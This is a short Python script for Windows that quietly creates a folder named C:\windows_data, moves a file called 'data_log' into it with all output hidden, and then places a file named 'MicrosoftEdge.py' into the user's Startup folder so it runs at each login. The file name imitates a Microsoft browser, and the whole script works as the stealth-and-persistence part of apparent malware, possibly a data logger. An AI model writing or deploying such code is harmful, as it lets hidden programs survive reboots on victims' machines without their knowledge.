import subprocess
import os
def create_folder():
    current_dir = os.getcwd()
    os.chdir("C:\\")
    subprocess.run(["cmd", "/c", "md", "windows_data"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chdir(current_dir)
    subprocess.run(["cmd", "/c", "move", "data_log", "C:\\windows_data"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

create_folder()
def move_to_startup():
    startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    subprocess.run(["cmd", "/c", "move", "MicrosoftEdge.py", startup_folder], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

move_to_startup()
